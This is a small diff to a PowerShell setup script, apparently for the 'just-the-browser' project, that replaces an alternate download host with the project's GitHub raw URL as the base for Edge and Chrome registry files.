@@ -5,8 +5,7 @@
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 
 $OS = Get-CimInstance Win32_OperatingSystem
-# $BaseURL = "https://raw.githubusercontent.com/corbindavenport/just-the-browser/main/"
-$BaseURL = "https://kalak.fun/jtb/"
+$BaseURL = "https://raw.githubusercontent.com/corbindavenport/just-the-browser/main/"
 $MicrosoftEdgeInstallRegistry = "$BaseURL/edge/install.reg"
 $MicrosoftEdgeUninstallRegistry = "$BaseURL/edge/uninstall.reg"
 $GoogleChromeInstallRegistry = "$BaseURL/chrome/install.reg"
